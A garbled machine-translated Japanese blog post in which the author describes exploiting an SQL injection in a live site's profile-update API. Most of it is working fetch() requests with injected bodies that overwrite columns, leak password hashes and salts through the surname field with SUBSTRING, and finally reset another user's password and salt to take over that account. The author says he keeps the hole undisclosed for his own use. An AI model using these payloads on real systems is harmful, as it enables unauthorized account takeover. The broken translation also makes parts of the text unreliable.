私の最初のハック：ユーザーのパスワードを設定できるサイト

最近、私は興味深い脆弱性を発見しました。これは、ユーザーが特定のサイトを任意のパスワードに設定できるようにするものです。かっこいい？

面白かったし、面白い記事を書けると思った。

あなたはそれにつまずきました。



注：翻訳された記事の著者は情報セキュリティの専門家ではありません。これは、SQLインジェクションの世界への彼の最初の遠足です。彼は「に恩着せがましいことを要求する彼の認識の甘さ。」

警告：翻訳された記事の著者は、この脆弱性のあるサイトを開示しません。彼がそのことを所有者に知らせて沈黙に縛られているからではなく、自分のために脆弱性を守りたいからです。このサイトを見つけた場合は、口を閉じてください（tsyts）。

これは、開発者向けのツールキットでWebサイトを開いて、縮小されたコードとネットワークリクエストを目的なしに調べる方法です。そして突然、あなたは何かがここで間違っていることに気づきます。そんなことは全然ない。そのため、いずれかのサイトのユーザープロファイルページで同様のことを行い、受信の通知をオンまたはオフにすると、ページがネットワーク要求を送信することに気付きました。

/api/users?email=no

そして私は思った：彼らはいくつかの愚かさを許可したのだろうか？たぶん私はSQLインジェクションを試すべきですか？

私は「xkcd little bobby tables」をネットで検索して、SQLインジェクションの実行方法に関するメモリを更新しました—それらは好きではありません—機能するように設定しました。

Chromeネットワークタブで、リクエストをコピーし（[コピー]> [フェッチとしてコピー]）、結果をフラグメントに貼り付けて、リクエストを再生できるようにしました。

fetch('https://blah.com/api/users', {
  credentials: 'include',
  headers: {
    authorization: 'Bearer blah',
    'content-type': 'application/x-www-form-urlencoded',
    'sec-fetch-mode': 'cors',
    'x-csrf-token': 'blah',
  },
  referrer: 'https://blah.com/blah',
  referrerPolicy: 'no-referrer-when-downgrade',
  body: 'email=no', // < -- The bit we're interested in
  method: 'POST',
  mode: 'cors',
});

記事の残りの部分では、文字列の扱いに専念しbodyます。これは、サーバーに指示を送信するためのトランスポートです。

最初に、列lastNameに値を設定して姓を変更しようとしました。

{
  // ...
  body: `email=no', lastName='testing`
}

興味深いことは何も起こりませんでした。それから私はで同じことをしましたlast_name、そして私は私の運を試しましたsurname-そしておっと！-ページが私の姓を「testing」に置き換えました。

それはだった非常にエキサイティング。私はいつもSQLインジェクションを少し本の伝説と考えていました。事実、それはしない、本当に直接SQL式に挿入するユーザー入力するコードを世界に開きます。

すべての初心者のために、私が発見した結果の意味を説明します。
私はサーバーで同様のことが起こると信じています：

const userId = someSessionStore.userId;
const email = request.body.email;

const sql = `UPDATE users SET email = '${email}' WHERE id = '${userId}'`;

彼らのサーバーはPHPで書かれていると思いますが、私はこの言語を話せないので、JavaScriptで例を書きます。また、私はSQLクエリがあまり得意ではありません。テーブルの名前が、、、userまたはのどちらusersであるかuser_tableはわかりませんが、問題ありません。

ユーザーIDが1234で、email = noを送信すると、SQLは次のようになります。

UPDATE users SET email = 'no' WHERE id = '1234'

またno、文字列no', surname = 'testingに置き換えると、SQLは有効になりますが、注意が必要です。

UPDATE users SET email = 'no', surname = 'testing' WHERE id = '1234'

ご存じのとおり、私はプロフィールページにいる間、開発者ツールのコードスニペットからリクエストを送信します。したがって、これからは、このページの姓フィールド（HTML <input>要素）をsurname、データベースの列にユーザーアカウントの値を設定して情報を書き込むことができる小さな標準出力と見なすことができます。

次に、別の列から列にデータをコピーできるかどうか疑問に思いましたsurnameか？

私は何をすべきか、SQLをどうするべきかを理解していませんでした。また、サーバーで使用されているデータベースもわかりませんでした。したがって、各ステップの後、ネットを検索してから20分間費やしてから、さらに20分間頭をひっかきました。これは、引用符を間違った方向に挿入していたためです。データベース全体を破壊しなかったのは奇妙です。

ある列から別の列へのデータのコピーは、そのようなリクエストを送信したかったので、もう少し難しいことがわかりました（列があるはずですpassword）。

UPDATE users SET email = 'no', surname = password WHERE id = '1234'

コードの前後にpassword引用符がないことに注意してください。ご存じのように、超近代的なクエリデザイナーは次のようになります...

const sql = `UPDATE users SET email = '${email}' WHERE id = '${userId}'`;

...つまり、no', surname = password結果の文字列を渡そうとすると、有効なSQLクエリではなくなります。代わりに、注入された文字列全体をリクエストの2番目の部分にする必要があり、その後に続くすべてを無視する必要があります。特に、私は伝える必要がWHEREありました。SQLステートメントの最後とコメント。#これにより、右側の情報は無視されます。はい、私はひどく説明します。

つまり、新しい行を送信しました。

{
  // ...
  body: `email=no', surname = password WHERE username = 'me@email.com'; #`
}

そして、次の行がデータベースに送信されます。

UPDATE users SET email = 'no', surname = password WHERE username = 'me@email.com'; 
# WHERE id = '1234'

WHERE id = '1234'この部分はコメント＃の後にあるため 、データベースはこれを無視することに注意してください（SQLクエリでのコメントの禁止は、ずさんなコードから保護するための良い方法のようです）。

パスワードP @ ssword1が姓のフィールドにテキスト形式で表示されることを望んでいましたが、代わりに00fcdde26dd77af7858a52e3913e6f3330a32b31が表示されました。

これには驚きませんでしたが、私はがっかりしました。パスワードのハッシュを別のユーザーのパスワード列にコピーし続けました。

初心者のために説明しましょう。どこかにアカウントを作成して新しいパスワードP @ ssword1を送信すると、00fcdde26dd77af7858a52e3913e6f3330a32b31のようなハッシュになり、データベースに保存されます。このハッシュを見ると、誰もあなたのパスワードを判別することはできません（またはそのように彼らは言っています）。

次回ログインしてパスワードPassword @ 1を入力すると、サーバーはそれを再度ハッシュし、データベースに格納されているハッシュと比較します。これにより、パスワードを保存することなくコンプライアンスを確認できます。

つまり、誰かにパスワードP @ ssword1を与えたい場合、このユーザーのパスワード列を00fcdde26dd77af7858a52e3913e6f3330a32b31に設定する必要があります。

軽量です。

別のブラウザーを開き、別のメールで新しいユーザーを作成し、最初にデータを設定できるかどうかを確認しました。彼にプロパティを更新しましたbody：

{
  // ...
  body: `email=no', surname = 'WOOT!!' WHERE username = 'user-two@email.com'; #`
}

私はコードを実行し、このユーザーのページを更新し、そして、もちろん、それはうまくいきました！今、彼は「WOOT !!」という姓を持っていました。（私の祖母の旧姓）。

次に、このユーザーのパスワードを設定しようとしました：

  // ...
  body: `email=no', password = '00fcdde26dd77af7858a52e3913e6f3330a32b31' WHERE username = 'user-two@email.com'; #`
}

そして、あなたは何を知っていますか？！？！？

動作しませんでした。今、私は2番目のアカウントにアクセスできませんでした。
計算に数時間かかる2つの誤りを犯したことがわかりました。この記事を読んだ情報セキュリティの専門家は、彼らが話していることをすでに理解しており、おそらく「最年少のハッキング」の最初のページにリストされている彼の「エクスプロイト」を書いている愚か者を笑っています。

Nuuuuuu、最後にネットワークで「パスワードハッシュ」を検索したところ、多くのハッシュが00fcdde26dd77af7858a52e3913e6f3330a32b31よりも長いことがわかりました。彼はどこかで作物を作っているようです。
姓フィールドにテキストを入力しようとしたところ、40文字の制限が見つかりました（データベースの制約と一致するように<input>のmaxlength属性を設定するのは良いことです）。

今私はハッシュの最初の40文字だけに興味がありましたが、もっと長くなる可能性があります。「sql substring」というクエリを検索して、すぐに次のリクエストをサーバーに送信しました。

 
{
  // ...
  body: `email=no', surname = SUBSTRING(password, 30, 1000) WHERE username = 'me@email.com'; #`
}

最初の10文字が最後の10文字00fcdde26dd77af7858a52e3913e6f3330a32b31と確実にオーバーラップするように、30で開始しました。または最後の9または11。

まだ2番目のアカウントにログインできませんでしたが、すでにこれに近づいていました（その瞬間にそれを知っておくといいでしょう）。

「ベストプラクティスデータベースのパスワード」を検索して、「塩」などを見つけて記憶しました。

saltを使用すると、あるユーザーのP @ ssword1のハッシュを作成した場合、他のユーザーの同じパスワードで異なるハッシュが得られます（別のソルトが使用されます）。もちろん、1つのパスワードハッシュは2人のユーザーに対して機能しません。ソルトは異なります。

それは賢いようですが、同時に愚かです。表のすべての例で、saltと呼ばれる別の列がありました。これは、1つではなく2つの列からデータをコピーする必要があるという意味ではありませんか？同じキーが合う2番目のロックのように見えませんか？

から姓の列に値をコピーすることを期待して、クエリを変更しました。

 {
  // ...
  body: `email=no', surname = salt WHERE username = 'myemail@email.com'; #`
}

姓フィールドにランダムな文字セットが表示されました。これは良い兆候です。結局64文字のソルトであることが判明したので、もう一度SUBSTRINGを使用しました。

すべてが準備できました。パスワードハッシュとその作成に使用したソルトを持っているので、それらを別のユーザーにコピーするだけです。そして、その夜に最後のネットワークリクエストを送信しました。

fetch('https://blah.com/api/users', {
  credentials: 'include',
  headers: {
    authorization: 'Bearer blah',
    'content-type': 'application/x-www-form-urlencoded',
    'sec-fetch-mode': 'cors',
    'x-csrf-token': 'blah',
  },
  referrer: 'https://blah.com/blah',
  referrerPolicy: 'no-referrer-when-downgrade',
  body: `email=no', password = '00fcdde26dd77af7858a52e3913e6f3330a32b3121a61bce915cc6145fc44453', salt = '8b7df143d91c716ecfa5fc1730022f6b421b05cedee8fd52b1fc65a96030ad52' WHERE username = 'user-two@gmail.com'; #`,
  method: 'POST',
  mode: 'cors',
});

動いた！これで、最初のアカウントのパスワードを使用して2番目のアカウントにログインできました。
